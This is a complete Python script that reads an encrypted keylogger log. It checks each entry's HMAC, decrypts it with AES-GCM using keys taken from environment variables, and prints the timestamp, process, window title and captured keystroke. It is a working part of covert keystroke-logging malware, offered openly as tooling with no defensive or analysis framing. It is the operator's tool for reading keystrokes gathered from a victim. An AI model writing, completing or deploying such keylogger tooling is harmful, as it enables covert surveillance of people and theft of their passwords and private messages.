# decrypt_keylog.py
import os
import json
import base64
import hmac
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = os.environ.get("KEYLOGGER_AES_KEY")  # Must be 32 bytes
HMAC_KEY = os.environ.get("KEYLOGGER_HMAC_KEY")  # Must be 32 bytes
LOG_FILE = "keylog_encrypted.txt"

if not KEY or not HMAC_KEY:
    raise EnvironmentError("Keys not set in environment variables.")

KEY = base64.b64decode(KEY)
HMAC_KEY = base64.b64decode(HMAC_KEY)

def verify_hmac(encrypted: bytes, expected_hmac: bytes) -> bool:
    computed_hmac = hmac.new(HMAC_KEY, encrypted, hashlib.sha256).digest()
    return hmac.compare_digest(computed_hmac, expected_hmac)

def decrypt_entry(nonce: bytes, encrypted: bytes) -> dict:
    aesgcm = AESGCM(KEY)
    return json.loads(aesgcm.decrypt(nonce, encrypted, None))

def read_and_decrypt_logs():
    with open(LOG_FILE, "r") as f:
        for line in f:
            try:
                record = json.loads(line.strip())
                nonce = base64.b64decode(record["nonce"])
                data = base64.b64decode(record["data"])
                hmac_sig = base64.b64decode(record["hmac"])

                if not verify_hmac(data, hmac_sig):
                    print("[!] Tampering detected in log entry.")
                    continue

                entry = decrypt_entry(nonce, data)
                print(f"{entry['timestamp']} | {entry['process']} | {entry['window']} | {entry['key']}")

            except Exception as e:
                print(f"Error decrypting log: {e}")

if __name__ == "__main__":
    read_and_decrypt_logs()
